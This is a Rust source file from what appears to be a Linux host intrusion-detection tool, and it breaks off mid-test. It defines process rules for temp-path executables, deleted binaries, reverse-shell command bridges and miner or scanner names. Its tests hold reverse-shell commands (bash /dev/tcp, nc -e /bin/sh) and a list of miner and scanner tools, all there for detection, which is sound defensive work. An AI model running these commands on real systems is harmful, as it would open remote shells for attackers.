use crate::detectors::command_profile::{
    network_execution_assessment_from_event, CommandAssessment,
};
use crate::detectors::risk::RiskAssessment;
use crate::detectors::{
    evidence, package_activity_context, path_is_allowlisted, string_field, DetectContext, Detector,
};
use crate::rules::model::RuleMetadata;
use crate::utils::package::PackageOwnerCache;
use sentinel_core::{Category, Finding, RawEvent, Severity};
use std::collections::{BTreeMap, BTreeSet};

const ROOT_UID: &str = "0";
const PROCESS_STABLE_DEDUP_KEYS: &[&str] = &["exe_path", "cmdline", "name"];

pub struct ProcessDetector;

impl Detector for ProcessDetector {
    fn name(&self) -> &'static str {
        "process_rules"
    }

    fn rules(&self) -> Vec<RuleMetadata> {
        vec![
            RuleMetadata::new(
                "PROC-001",
                "Process running from temporary path",
                Category::Process,
                Severity::High,
                "A process executable path is under a suspicious temporary directory.",
            ),
            RuleMetadata::new(
                "PROC-002",
                "Deleted executable still running",
                Category::Process,
                Severity::High,
                "A deleted process executable has additional suspicious traits.",
            ),
            RuleMetadata::new(
                "PROC-003",
                "Network command execution bridge",
                Category::Process,
                Severity::Critical,
                "A process command line combines a network channel with shell, system, or fd-bridged execution traits.",
            ),
            RuleMetadata::new(
                "PROC-004",
                "Possible miner or scanner process",
                Category::Process,
                Severity::Critical,
                "A process identity matches a configured miner or scanner tool name.",
            ),
            RuleMetadata::new(
                "PROC-005",
                "Suspicious process behavior cluster",
                Category::Process,
                Severity::High,
                "A process combines multiple weak behavior signals such as masquerading, web-path execution, hidden names, or unusual socket activity.",
            ),
        ]
    }

    fn detect(&self, events: &[RawEvent], ctx: &DetectContext) -> Vec<Finding> {
        let mut findings = Vec::new();
        let outbound_by_pid = outbound_context_by_pid(events);
        let package_activity = package_activity_context(events);
        let mut package_owner_cache = PackageOwnerCache::default();
        for event in events
            .iter()
            .filter(|event| event.kind == "process_snapshot")
        {
            let mut enriched = event.clone();
            if let Some(pid) = event.field("pid") {
                if let Some(outbound) = outbound_by_pid.get(pid) {
                    enriched = enriched
                        .with_field("outbound_connection_count", outbound.total.to_string())
                        .with_field("public_outbound_count", outbound.public.to_string())
                        .with_field("outbound_remote_ports", outbound.remote_ports.join(", "));
                }
            }
            if package_activity.is_active() {
                enriched = enriched.with_field("package_activity_recent", "true");
            }
            let event = &enriched;
            let exe_path = string_field(event, "exe_path");
            let cmdline = string_field(event, "cmdline");
            if path_is_allowlisted(&exe_path, &ctx.config.allowlist.process_paths)
                || command_matches_allowlist(
                    &cmdline,
                    &ctx.config.allowlist.process_command_contains,
                )
            {
                continue;
            }
            if let Some(assessment) = deleted_executable_assessment(event, ctx) {
                if assessment.is_suspicious(ctx.config.process.deleted_executable_min_score) {
                    findings.push(deleted_executable(
                        event,
                        ctx,
                        assessment,
                        &mut package_owner_cache,
                    ));
                }
            }
            if process_from_suspicious_dir(&exe_path, ctx) {
                findings.push(temp_process(event, ctx, &mut package_owner_cache));
            }
            if network_execution_assessment_from_event(event).is_suspicious() {
                findings.push(network_execution_bridge(
                    event,
                    ctx,
                    &mut package_owner_cache,
                ));
            }
            if let Some(tool_match) =
                known_tool_match(event, &ctx.config.process.known_bad_tool_names)
            {
                findings.push(miner_or_scanner(
                    event,
                    ctx,
                    tool_match,
                    &mut package_owner_cache,
                ));
            }
            if let Some(assessment) = behavior_cluster_assessment(event, ctx) {
                if assessment.is_suspicious(ctx.config.process.behavior_min_score) {
                    findings.push(process_behavior_cluster(
                        event,
                        ctx,
                        assessment,
                        &mut package_owner_cache,
                    ));
                }
            }
        }
        findings
    }
}

fn temp_process(
    event: &RawEvent,
    ctx: &DetectContext,
    package_cache: &mut PackageOwnerCache,
) -> Finding {
    let subject = string_field(event, "exe_path");
    Finding::new(
        &ctx.host_id,
        "Process executable in temporary path",
        "A running process executable is located in a path commonly abused for malware staging.",
        Severity::High,
        Category::Process,
        "PROC-001",
        subject,
    )
    .with_evidence_deduped_by(process_evidence(event, package_cache), &["exe_path"])
    .with_recommendations(vec![
        "Inspect the executable hash, parent process, and file owner.".to_string(),
        "Preserve evidence before stopping or removing the process.".to_string(),
    ])
}

fn deleted_executable(
    event: &RawEvent,
    ctx: &DetectContext,
    assessment: RiskAssessment,
    package_cache: &mut PackageOwnerCache,
) -> Finding {
    Finding::new(
        &ctx.host_id,
        "Deleted executable still running",
        "A deleted process executable is still running and has additional suspicious traits.",
        Severity::High,
        Category::Process,
        "PROC-002",
        process_subject(event),
    )
    .with_evidence_deduped_by(
        {
            let mut items = process_evidence(event, package_cache);
            items.push(evidence("risk_score", assessment.score.to_string()));
            items.push(evidence("risk_reasons", assessment.reason_text()));
            items.push(evidence("risk_features", assessment.feature_names()));
            items
        },
        PROCESS_STABLE_DEDUP_KEYS,
    )
    .with_recommendations(vec![
        "Capture process details and network connections before termination.".to_string(),
        "Review how the process was launched.".to_string(),
    ])
}

fn deleted_executable_assessment(event: &RawEvent, ctx: &DetectContext) -> Option<RiskAssessment> {
    let exe_path = string_field(event, "exe_path");
    if !is_deleted_executable_path(&exe_path) {
        return None;
    }

    let normalized_path = normalize_deleted_executable_path(&exe_path);
    let mut assessment = RiskAssessment::default();

    if is_memfd_or_anonymous_path(&normalized_path) {
        assessment.add_signal(
            90,
            "anonymous_deleted_executable",
            "deleted executable is backed by memfd or an anonymous file",
        );
    }

    if path_in_suspicious_dirs(&normalized_path, &ctx.config.process.suspicious_dirs) {
        assessment.add_signal(
            80,
            "temporary_deleted_executable",
            "deleted executable is running from a suspicious temporary directory",
        );
    }

    if hidden_basename(&normalized_path) && !is_standard_runtime_path(&normalized_path) {
        assessment.add_signal(
            70,
            "hidden_nonstandard_executable",
            "deleted executable has a hidden basename outside standard runtime paths",
        );
    }

    let command_assessment = network_execution_assessment_from_event(event);
    if command_assessment.is_suspicious() {
        assessment.add_signal(
            85,
            "network_execution_bridge",
            command_assessment.reason_text(),
        );
    }

    if let Some(tool_match) = known_tool_match(event, &ctx.config.process.known_bad_tool_names) {
        assessment.add_signal(
            85,
            "known_bad_tool",
            format!(
                "process identity '{}' matches configured tool '{}'",
                tool_match.value, tool_match.tool
            ),
        );
    }
    if let Some(cpu) = high_cpu_signal(event, ctx) {
        assessment.add_signal(55, "sustained_high_cpu", cpu.reason());
    }

    if is_shell_process_name(&string_field(event, "name")) {
        assessment.add_signal(
            45,
            "shell_process",
            "deleted executable process name is a shell",
        );
    }

    Some(assessment)
}

fn network_execution_bridge(
    event: &RawEvent,
    ctx: &DetectContext,
    package_cache: &mut PackageOwnerCache,
) -> Finding {
    let assessment = network_execution_assessment_from_event(event);
    Finding::new(
        &ctx.host_id,
        "Network command execution bridge detected",
        "A process command line combines a network channel with shell, system, or fd-bridged execution traits.",
        Severity::Critical,
        Category::Process,
        "PROC-003",
        process_subject(event),
    )
    .with_evidence_deduped_by(
        process_evidence_with_assessment(event, &assessment, package_cache),
        PROCESS_STABLE_DEDUP_KEYS,
    )
    .with_impact(vec![
        "This may indicate active remote command execution when the process is not expected."
            .to_string(),
    ])
    .with_recommendations(vec![
        "Isolate network access if the process is unauthorized.".to_string(),
        "Preserve command line, executable, and parent process evidence.".to_string(),
    ])
}

fn miner_or_scanner(
    event: &RawEvent,
    ctx: &DetectContext,
    tool_match: KnownToolMatch,
    package_cache: &mut PackageOwnerCache,
) -> Finding {
    let high_cpu = high_cpu_signal(event, ctx);
    Finding::new(
        &ctx.host_id,
        if high_cpu.is_some() {
            "Miner or scanner process with sustained CPU activity"
        } else {
            "Known miner or scanner process identity"
        },
        if high_cpu.is_some() {
            "A running process matches a configured miner or scanner identity and has sustained CPU activity."
        } else {
            "A running process identity matches a configured miner or scanner tool name."
        },
        Severity::Critical,
        Category::Process,
        "PROC-004",
        process_subject(event),
    )
    .with_evidence_deduped_by(
        {
            let mut items = process_evidence(event, package_cache);
            items.push(evidence("matched_tool", tool_match.tool));
            items.push(evidence("match_source", tool_match.source));
            items.push(evidence("matched_value", tool_match.value));
            if let Some(cpu) = high_cpu {
                items.push(evidence("risk_score", "90"));
                items.push(evidence("risk_reasons", cpu.reason()));
                items.push(evidence(
                    "risk_features",
                    "known_bad_tool, sustained_high_cpu",
                ));
            } else {
                items.push(evidence("risk_score", "70"));
                items.push(evidence(
                    "risk_reasons",
                    "configured miner/scanner identity matched",
                ));
                items.push(evidence("risk_features", "known_bad_tool"));
            }
            items
        },
        PROCESS_STABLE_DEDUP_KEYS,
    )
    .with_impact(vec![
        "Unexpected miner or scanner processes can indicate resource abuse, reconnaissance, or post-compromise tooling.".to_string(),
    ])
    .with_recommendations(vec![
        "Confirm whether the binary was intentionally installed and scheduled by an administrator.".to_string(),
        "Review CPU usage, outbound connections, parent process, file owner, and package provenance.".to_string(),
        "Rotate credentials if compromise is confirmed.".to_string(),
    ])
}

fn process_behavior_cluster(
    event: &RawEvent,
    ctx: &DetectContext,
    assessment: BehaviorAssessment,
    package_cache: &mut PackageOwnerCache,
) -> Finding {
    Finding::new(
        &ctx.host_id,
        "Suspicious process behavior cluster",
        "A process combines multiple weak behavior signals that are more suspicious together than individually.",
        Severity::High,
        Category::Process,
        "PROC-005",
        process_subject(event),
    )
    .with_evidence_deduped_by(
        {
            let mut items = process_evidence(event, package_cache);
            items.push(evidence("cwd", string_field(event, "cwd")));
            items.push(evidence("euid", string_field(event, "euid")));
            items.push(evidence(
                "socket_fd_count",
                string_field(event, "socket_fd_count"),
            ));
            items.push(evidence("risk_score", assessment.score.to_string()));
            items.push(evidence("risk_reasons", assessment.reason_text()));
            items.push(evidence("risk_features", assessment.feature_names()));
            items
        },
        PROCESS_STABLE_DEDUP_KEYS,
    )
    .with_impact(vec![
        "Renamed or lightly disguised malware may avoid simple command-line signatures."
            .to_string(),
    ])
    .with_recommendations(vec![
        "Verify the executable path, owner, package provenance, and network connections."
            .to_string(),
        "Preserve process evidence before stopping it if it is unexpected.".to_string(),
    ])
}

fn process_evidence(
    event: &RawEvent,
    package_cache: &mut PackageOwnerCache,
) -> Vec<sentinel_core::Evidence> {
    let mut items = vec![
        evidence("pid", string_field(event, "pid")),
        evidence("ppid", string_field(event, "ppid")),
        evidence("name", string_field(event, "name")),
        evidence("exe_path", string_field(event, "exe_path")),
        evidence("cmdline", string_field(event, "cmdline")),
    ];
    push_evidence_if_present(&mut items, event, "parent_name");
    push_evidence_if_present(&mut items, event, "systemd_unit");
    push_evidence_if_present(&mut items, event, "systemd_execstart");
    push_evidence_if_present(&mut items, event, "container_context");
    push_evidence_if_present(&mut items, event, "exe_uid");
    push_evidence_if_present(&mut items, event, "exe_gid");
    push_evidence_if_present(&mut items, event, "exe_size");
    push_evidence_if_present(&mut items, event, "exe_hash_blake3");
    push_evidence_if_present(&mut items, event, "cpu_percent");
    push_evidence_if_present(&mut items, event, "cpu_total_seconds");
    push_evidence_if_present(&mut items, event, "process_age_seconds");
    push_evidence_if_present(&mut items, event, "process_start_drift");
    push_evidence_if_present(&mut items, event, "outbound_connection_count");
    push_evidence_if_present(&mut items, event, "public_outbound_count");
    push_evidence_if_present(&mut items, event, "outbound_remote_ports");
    push_evidence_if_present(&mut items, event, "package_activity_recent");
    push_package_owner_if_available(&mut items, event, package_cache);
    items
}

fn process_subject(event: &RawEvent) -> String {
    for key in ["exe_path", "cmdline", "name", "pid"] {
        let value = string_field(event, key);
        let value = value
            .trim()
            .strip_suffix(" (deleted)")
            .unwrap_or_else(|| value.trim())
            .to_string();
        if !value.is_empty() {
            return value;
        }
    }
    "unknown-process".to_string()
}

#[derive(Debug, Clone, Default)]
struct BehaviorAssessment {
    score: u16,
    reasons: BTreeSet<String>,
    features: BTreeSet<String>,
}

impl BehaviorAssessment {
    fn add_signal(&mut self, score: u16, feature: impl Into<String>, reason: impl Into<String>) {
        self.score = self.score.saturating_add(score);
        self.features.insert(feature.into());
        self.reasons.insert(reason.into());
    }

    fn is_suspicious(&self, min_score: u16) -> bool {
        self.score >= min_score
    }

    fn reason_text(&self) -> String {
        self.reasons.iter().cloned().collect::<Vec<_>>().join("; ")
    }

    fn feature_names(&self) -> String {
        self.features.iter().cloned().collect::<Vec<_>>().join(", ")
    }

    #[cfg(test)]
    fn has_feature(&self, feature: &str) -> bool {
        self.features.contains(feature)
    }

    fn has_primary_behavior_signal(&self) -> bool {
        [
            "kernel_thread_masquerade",
            "web_path_executable",
            "hidden_executable_name",
            "suspicious_cwd",
        ]
        .iter()
        .any(|feature| self.features.contains(*feature))
    }
}

fn behavior_cluster_assessment(
    event: &RawEvent,
    ctx: &DetectContext,
) -> Option<BehaviorAssessment> {
    let mut assessment = BehaviorAssessment::default();
    let name = string_field(event, "name");
    let exe_path = string_field(event, "exe_path");
    let cmdline = string_field(event, "cmdline");
    let cwd = string_field(event, "cwd");
    let euid = string_field(event, "euid");
    let socket_fd_count = string_field(event, "socket_fd_count")
        .parse::<usize>()
        .unwrap_or(0);
    let public_outbound_count = string_field(event, "public_outbound_count")
        .parse::<usize>()
        .unwrap_or(0);

    if exe_path.is_empty() && cmdline.is_empty() {
        return None;
    }

    if looks_like_kernel_thread_name(&name) && !exe_path.is_empty() && !cmdline.is_empty() {
        assessment.add_signal(
            55,
            "kernel_thread_masquerade",
            "userland process name resembles a kernel thread",
        );
    }
    if path_in_web_roots(&exe_path, ctx) {
        assessment.add_signal(
            40,
            "web_path_executable",
            "process executable is under a configured web root",
        );
    }
    if hidden_basename(&exe_path) {
        assessment.add_signal(
            25,
            "hidden_executable_name",
            "process executable has a hidden basename",
        );
    }
    if path_in_suspicious_dirs(&cwd, &ctx.config.process.suspicious_dirs) {
        assessment.add_signal(
            30,
            "suspicious_cwd",
            "process current working directory is under a suspicious temporary path",
        );
    }
    if socket_fd_count >= ctx.config.process.suspicious_socket_fd_threshold {
        assessment.add_signal(
            30,
            "many_socket_fds",
            "process owns many socket file descriptors",
        );
    } else if socket_fd_count > 0 {
        assessment.add_signal(
            15,
            "socket_activity",
            "process owns socket file descriptors",
        );
    }
    if let Some(cpu) = high_cpu_signal(event, ctx) {
        assessment.add_signal(25, "sustained_high_cpu", cpu.reason());
    }
    if public_outbound_count > 0 {
        assessment.add_signal(
            20,
            "public_outbound_connections",
            "process has established outbound connections to public addresses",
        );
    }
    if string_field(event, "process_start_changed") == "true" && assessment.score >= 40 {
        assessment.add_signal(
            10,
            "process_start_drift",
            "same process identity has a different procfs start time than the previous scan",
        );
    }
    if !string_field(event, "container_context").is_empty() && assessment.score >= 40 {
        assessment.add_signal(
            10,
            "container_context",
            "process is running inside a container or container-managed cgroup",
        );
    }
    if euid == ROOT_UID && assessment.score >= 55 {
        assessment.add_signal(
            15,
            "privileged_suspicious_process",
            "suspicious process signals are running with effective root privileges",
        );
    }

    if assessment.score == 0 || !assessment.has_primary_behavior_signal() {
        None
    } else {
        Some(assessment)
    }
}

fn path_in_web_roots(path: &str, ctx: &DetectContext) -> bool {
    ctx.config.web.web_roots.iter().any(|root| {
        let root = root.to_string_lossy().replace('\\', "/");
        path == root || path.starts_with(&format!("{root}/"))
    })
}

fn process_evidence_with_assessment(
    event: &RawEvent,
    assessment: &CommandAssessment,
    package_cache: &mut PackageOwnerCache,
) -> Vec<sentinel_core::Evidence> {
    let mut items = process_evidence(event, package_cache);
    items.push(evidence("risk_score", assessment.score.to_string()));
    items.push(evidence("risk_reasons", assessment.reason_text()));
    items.push(evidence("risk_features", assessment.feature_names()));
    items
}

fn process_from_suspicious_dir(path: &str, ctx: &DetectContext) -> bool {
    path_in_suspicious_dirs(path, &ctx.config.process.suspicious_dirs)
}

pub(crate) fn path_in_suspicious_dirs(path: &str, dirs: &[std::path::PathBuf]) -> bool {
    dirs.iter().any(|dir| {
        let prefix = dir.to_string_lossy().replace('\\', "/");
        path == prefix || path.starts_with(&format!("{prefix}/"))
    })
}

pub(crate) fn command_matches_allowlist(command: &str, allowlist: &[String]) -> bool {
    let command = command.trim();
    if command.is_empty() {
        return false;
    }
    allowlist
        .iter()
        .map(|item| item.trim())
        .filter(|item| !item.is_empty())
        .any(|item| command.contains(item))
}

pub(crate) fn event_contains_miner_or_scanner(
    event: &RawEvent,
    known_tool_names: &[String],
) -> bool {
    known_tool_match(event, known_tool_names).is_some()
}

#[derive(Debug, Clone)]
struct KnownToolMatch {
    tool: String,
    source: &'static str,
    value: String,
}

fn known_tool_match(event: &RawEvent, known_tool_names: &[String]) -> Option<KnownToolMatch> {
    let mut saw_identity = false;
    for (field, source) in [
        ("exe_path", "exe_path"),
        ("executable", "executable"),
        ("name", "process_name"),
        ("process_name", "process_name"),
    ] {
        let Some(value) = event.field(field).filter(|value| !value.trim().is_empty()) else {
            continue;
        };
        saw_identity = true;
        if let Some(tool) =
            matched_known_tool_name(&command_token_basename(value), known_tool_names)
        {
            return Some(KnownToolMatch {
                tool,
                source,
                value: value.to_string(),
            });
        }
    }
    if let Some(first_arg) = event
        .field("argv_json")
        .and_then(|value| serde_json::from_str::<Vec<String>>(value).ok())
        .and_then(|args| args.into_iter().next())
        .filter(|value| !value.trim().is_empty())
    {
        saw_identity = true;
        if let Some(tool) =
            matched_known_tool_name(&command_token_basename(&first_arg), known_tool_names)
        {
            return Some(KnownToolMatch {
                tool,
                source: "argv0",
                value: first_arg,
            });
        }
    }
    if saw_identity {
        return None;
    }
    event
        .field("cmdline")
        .and_then(|command| matched_tool_in_args(command.split_whitespace(), known_tool_names))
        .map(|(tool, value)| KnownToolMatch {
            tool,
            source: "cmdline_token",
            value,
        })
}

#[cfg(test)]
pub(crate) fn contains_miner_or_scanner(command: &str, known_tool_names: &[String]) -> bool {
    args_contain_miner_or_scanner(command.split_whitespace(), known_tool_names)
}

#[cfg(test)]
fn args_contain_miner_or_scanner<'a, I>(args: I, known_tool_names: &[String]) -> bool
where
    I: IntoIterator<Item = &'a str>,
{
    matched_tool_in_args(args, known_tool_names).is_some()
}

fn matched_tool_in_args<'a, I>(args: I, known_tool_names: &[String]) -> Option<(String, String)>
where
    I: IntoIterator<Item = &'a str>,
{
    args.into_iter().find_map(|arg| {
        let name = command_token_basename(arg);
        matched_known_tool_name(&name, known_tool_names).map(|tool| (tool, arg.to_string()))
    })
}

fn command_token_basename(token: &str) -> String {
    let trimmed = token.trim_matches(|ch: char| {
        ch.is_ascii_whitespace()
            || matches!(
                ch,
                '"' | '\'' | '`' | ',' | ';' | '(' | ')' | '[' | ']' | '{' | '}'
            )
    });
    trimmed
        .rsplit(['/', '\\'])
        .next()
        .unwrap_or(trimmed)
        .to_ascii_lowercase()
}

fn matched_known_tool_name(name: &str, known_tool_names: &[String]) -> Option<String> {
    let normalized = name.strip_suffix(".exe").unwrap_or(name);
    known_tool_names.iter().find_map(|tool| {
        let candidate = command_token_basename(tool);
        let candidate = candidate.strip_suffix(".exe").unwrap_or(&candidate);
        (!candidate.is_empty() && normalized.eq_ignore_ascii_case(candidate))
            .then(|| candidate.to_string())
    })
}

#[derive(Debug, Clone, Copy)]
struct HighCpuSignal {
    percent: f32,
    age_seconds: f64,
}

impl HighCpuSignal {
    fn reason(self) -> String {
        format!(
            "process lifetime average CPU {:.1}% for {:.0}s exceeds configured threshold",
            self.percent, self.age_seconds
        )
    }
}

fn high_cpu_signal(event: &RawEvent, ctx: &DetectContext) -> Option<HighCpuSignal> {
    let percent = event.field("cpu_percent")?.parse::<f32>().ok()?;
    let age_seconds = event.field("process_age_seconds")?.parse::<f64>().ok()?;
    if percent >= ctx.config.process.high_cpu_threshold_percent
        && age_seconds >= ctx.config.process.high_cpu_duration_seconds as f64
    {
        Some(HighCpuSignal {
            percent,
            age_seconds,
        })
    } else {
        None
    }
}

#[derive(Debug, Clone, Default)]
struct OutboundContext {
    total: usize,
    public: usize,
    remote_ports: Vec<String>,
}

fn outbound_context_by_pid(events: &[RawEvent]) -> BTreeMap<String, OutboundContext> {
    let mut by_pid = BTreeMap::<String, OutboundContext>::new();
    for event in events
        .iter()
        .filter(|event| event.kind == "outbound_connection")
    {
        let Some(pid) = event.field("pid").filter(|pid| !pid.trim().is_empty()) else {
            continue;
        };
        let context = by_pid.entry(pid.to_string()).or_default();
        context.total += 1;
        if event.field("remote_public") == Some("true") {
            context.public += 1;
        }
        if let Some(port) = event
            .field("remote_port")
            .filter(|port| !port.trim().is_empty())
        {
            context.remote_ports.push(port.to_string());
            context.remote_ports.sort();
            context.remote_ports.dedup();
        }
    }
    by_pid
}

fn push_evidence_if_present(items: &mut Vec<sentinel_core::Evidence>, event: &RawEvent, key: &str) {
    let value = string_field(event, key);
    if !value.trim().is_empty() {
        items.push(evidence(key, value));
    }
}

fn push_package_owner_if_available(
    items: &mut Vec<sentinel_core::Evidence>,
    event: &RawEvent,
    package_cache: &mut PackageOwnerCache,
) {
    let path = string_field(event, "exe_path");
    if let Some(owner) = package_cache.owner_for_path(&path) {
        items.push(evidence("package_owner", owner));
    }
}

fn is_deleted_executable_path(path: &str) -> bool {
    path.contains(" (deleted)") || path.ends_with("deleted")
}

fn normalize_deleted_executable_path(path: &str) -> String {
    path.trim()
        .strip_suffix(" (deleted)")
        .unwrap_or_else(|| path.trim())
        .to_string()
}

fn is_memfd_or_anonymous_path(path: &str) -> bool {
    let lowered = path.to_ascii_lowercase();
    lowered.contains("memfd:") || lowered.contains("/deleted") || lowered == "deleted"
}

fn hidden_basename(path: &str) -> bool {
    path.rsplit('/')
        .next()
        .map(|name| name.starts_with('.') && name.len() > 1)
        .unwrap_or(false)
}

fn is_standard_runtime_path(path: &str) -> bool {
    [
        "/bin/",
        "/sbin/",
        "/lib/",
        "/lib64/",
        "/usr/bin/",
        "/usr/sbin/",
        "/usr/lib/",
        "/usr/lib64/",
        "/usr/libexec/",
        "/usr/local/bin/",
        "/usr/local/sbin/",
    ]
    .iter()
    .any(|prefix| path.starts_with(prefix))
}

fn is_shell_process_name(name: &str) -> bool {
    matches!(
        name,
        "sh" | "bash" | "dash" | "zsh" | "fish" | "ksh" | "busybox"
    )
}

fn looks_like_kernel_thread_name(name: &str) -> bool {
    let normalized = name.trim_matches(|ch| ch == '[' || ch == ']');
    normalized == "kworker"
        || normalized == "kthreadd"
        || normalized == "kswapd"
        || normalized == "ksoftirqd"
        || normalized == "watchdog"
        || normalized == "migration"
        || normalized.starts_with("kworker/")
        || normalized.starts_with("ksoftirqd/")
        || normalized.starts_with("rcu_")
        || normalized.starts_with("jbd2/")
}

#[cfg(test)]
mod tests {
    use super::{
        behavior_cluster_assessment, command_matches_allowlist, contains_miner_or_scanner,
        deleted_executable_assessment, event_contains_miner_or_scanner, ProcessDetector,
    };
    use crate::detectors::{
        command_profile::assess_network_execution_command, DetectContext, Detector,
    };
    use sentinel_core::{RawEvent, SentinelConfig};
    use std::sync::Arc;

    fn known_tools() -> Vec<String> {
        ["xmrig", "kinsing", "masscan", "zmap"]
            .into_iter()
            .map(str::to_string)
            .collect()
    }

    #[test]
    fn process_patterns_match_known_bad_fragments() {
        assert!(
            assess_network_execution_command("bash -i >& /dev/tcp/1.2.3.4/4444 0>&1")
                .is_suspicious()
        );
        assert!(
            assess_network_execution_command("nc -e /bin/sh 203.0.113.10 4444").is_suspicious()
        );
        assert!(
            assess_network_execution_command("tool TCP:203.0.113.10:4444 EXEC:/bin/sh")
                .is_suspicious()
        );
        let known_tools = known_tools();
        assert!(contains_miner_or_scanner(
            "/tmp/xmrig -o pool",
            &known_tools
        ));
        assert!(contains_miner_or_scanner(
            "/opt/tools/masscan --rate 1000",
            &known_tools
        ));
        assert!(contains_miner_or_scanner(
            "C:\\temp\\zmap.exe -p 22",
            &known_tools
        ));
        assert!(!contains_miner_or_scanner("/usr/bin/sshd", &known_tools));
        assert!(!contains_miner_or_scanner(
            "/opt/company/xmrigate --worker",
            &known_tools
        ));
    }

    #[test]
    fn process_tool_indicators_prefer_structured_argv() {
        let tools = vec!["xmrig.exe".to_string(), "/opt/tools/masscan".to_string()];
        let argv = serde_json::to_string(&vec!["/opt/company tools/xmrig".to_string()])
            .unwrap_or_default();
        let event = RawEvent::new("process", "process_snapshot")
            .with_field("argv_json", argv)
            .with_field("cmdline", "/opt/company tools/xmrig --pool");
        assert!(event_contains_miner_or_scanner(&event, &tools));

        let benign_argv = serde_json::to_string(&vec![
            "/usr/local/bin/worker".to_string(),
            "--profile".to_string(),
            "xmrig".to_string(),
        ])
        .unwrap_or_default();
        let benign = RawEvent::new("process", "process_snapshot")
            .with_field("argv_json", benign_argv)
            .with_field("cmdline", "/usr/local/bin/worker --profile xmrig");
        assert!(!event_contains_miner_or_scanner(&benign, &tools));
    }

    #[test]
    fn known_tool_finding_includes_match_source_and_cpu_context() {
        let ctx = DetectContext::new(Arc::new(SentinelConfig::default()));
        let event = process_event(
            "/usr/local/bin/xmrig",
            "xmrig",
            "/usr/local/bin/xmrig -o pool.example",
        )
        .with_field("cpu_percent", "96.5")
        .with_field("cpu_total_seconds", "300.0")
        .with_field("process_age_seconds", "240.0");

        let findings = ProcessDetector.detect(&[event], &ctx);
        let finding = findings
            .iter()
            .find(|finding| finding.rule_id == "PROC-004")
            .expect("known tool finding");

        assert!(finding.title.contains("sustained CPU"));
        assert!(finding
            .evidence
            .iter()
            .any(|item| item.key == "matched_tool" && item.value == "xmrig"));
        assert!(finding
            .evidence
            .iter()
            .any(|item| item.key == "match_source" && item.value == "exe_path"));
        assert!(finding
            .evidence
            .iter()
            .any(|item| item.key == "risk_features" && item.value.contains("sustained_high_cpu")));
    }

    #[test]
    fn high_cpu_alone_is_not_a_process_alert() {
        let ctx = DetectContext::new(Arc::new(SentinelConfig::default()));
        let event = process_event("/usr/local/bin/worker", "worker", "worker --serve")
            .with_field("cpu_percent", "98.0")
            .with_field("process_age_seconds", "600.0")
            .with_field("cwd", "/")
            .with_field("socket_fd_count", "0")
            .with_field("euid", "1000");

        let findings = ProcessDetector.detect(&[event], &ctx);

        assert!(findings.is_empty());
    }

    #[test]
    fn high_cpu_contributes_to_behavior_cluster_with_other_context() {
        let ctx = DetectContext::new(Arc::new(SentinelConfig::default()));
        let event = process_event("/usr/local/bin/.sysd", ".sysd", ".sysd --worker")
            .with_field("cpu_percent", "91.0")
            .with_field("process_age_seconds", "600.0")
            .with_field("cwd", "/")
            .with_field("socket_fd_count", "1")
            .with_field("euid", "0");

        let assessment = behavior_cluster_assessment(&event, &ctx);

        assert!(assessment.is_some_and(|assessment| {
            assessment.is_suspicious(70)
                && assessment.has_feature("sustained_high_cpu")
                && assessment.has_feature("hidden_executable_name")
        }));
    }

    #[test]
    fn process_start_drift_is_only_a_supporting_behavior_signal() {
        let ctx = DetectContext::new(Arc::new(SentinelConfig::default()));
        let normal_restart = process_event("/usr/local/bin/app", "app", "app --serve")
            .with_field("process_start_changed", "true")
            .with_field("previous_process_start_ticks", "100")
            .with_field("current_process_start_ticks", "200");

        assert!(behavior_cluster_assessment(&normal_restart, &ctx).is_none());

        let suspicious_restart =
            process_event("/var/www/html/.cache/kworker", "kworker", "kworker --serve")
                .with_field("cwd", "/")
                .with_field("socket_fd_count", "1")
                .with_field("process_start_changed", "true")
                .with_field("previous_process_start_ticks", "100")
                .with_field("current_process_start_ticks", "200");

        let assessment = behavior_cluster_assessment(&suspicious_restart, &ctx);

        assert!(assessment.is_some_and(|assessment| {
            assessment.has_feature("process_start_drift")
                && assessment.has_feature("kernel_thread_masquerade")
        }));
    }

    #[test]
    fn process_patterns_ignore_plain_traffic_forwarding() {
        assert!(!assess_network_execution_command(
            "socat TCP4-LISTEN:8848,reuseaddr,fork TCP4:example.com:443"
        )
        .is_suspicious());
        assert!(
            !assess_network_execution_command("gost -L=tcp://:8443 -F=tcp://example.com:443")
                .is_suspicious()
        );
        assert!(!assess_network_execution_command(
            "forwarder tcp-listen:8443 tcp:198.51.100.10:443"
        )
        .is_suspicious());
        assert!(
            !assess_network_execution_command("ssh -N -L 127.0.0.1:8080:10.0.0.1:80 bastion")
                .is_suspicious()
        );
    }

    #[test]
    fn process_command_allowlist_matches_configured_fragments() {
        let allowlist = vec!["TCP4-LISTEN:8848".to_string()];
        assert!(command_matches_allowlist(
            "socat TCP4-LISTEN:8848,reuseaddr,fork TCP4:example.com:443",
            &allowlist
        ));
        assert!(!command_matches_allowlist("/usr/bin/sshd", &allowlist));
    }

    #[test]
    fn deleted_executable_model_ignores_package_upgrade_residue() {
        let ctx = DetectContext::new(Arc::new(SentinelConfig::default()));
        let event = process_event(
            "/usr/lib/systemd/systemd (deleted)",
            "systemd",
            "/lib/systemd/systemd --user",
        );
        let assessment = deleted_executable_assessment(&event, &ctx);
        assert!(assessment.is_some_and(|assessment| !assessment.is_suspicious(70)));
    }

    #[test]
    fn detector_ignores_standard_deleted_service_binaries() {
        let ctx = DetectContext::new(Arc::new(SentinelConfig::default()));
        let events = vec![
            process_event(
                "/usr/sbin/dockerd (deleted)",
                "dockerd",
                "/usr/sbin/dockerd -H fd:// --containerd=/run/containerd/containerd.sock",
            ),
            process_event(
                "/usr/lib/systemd/systemd-logind (deleted)",
                "systemd-logind",
                "/lib/systemd/systemd-logind",
            ),
            process_event(
                "/usr/bin/python3.11 (deleted)",
                "unattended-upgr",
                "/usr/bin/python3 /usr/share/unattended-upgrades/unattended-upgrade-shutdown --wait-for-signal",
            ),
            process_event(
                "/usr/local/bin/vps-sentinel (deleted)",
                "vps-sentinel",
                "/usr/local/bin/vps-sentinel daemon --config /etc/vps-sentinel/config.toml",
            ),
        ];

        let findings = ProcessDetector.detect(&events, &ctx);

        assert!(findings.is_empty());
    }

    #[test]
    fn behavior_cluster_detects_renamed_web_path_process() {
        let ctx = DetectContext::new(Arc::new(SentinelConfig::default()));
        let event = process_event(
            "/var/www/html/.cache/kworker",
            "kworker",
            "/var/www/html/.cache/kworker --serve",
        )
        .with_field("cwd", "/var/www/html")
        .with_field("euid", "33")
        .with_field("socket_fd_count", "3");

        let assessment = behavior_cluster_assessment(&event, &ctx);

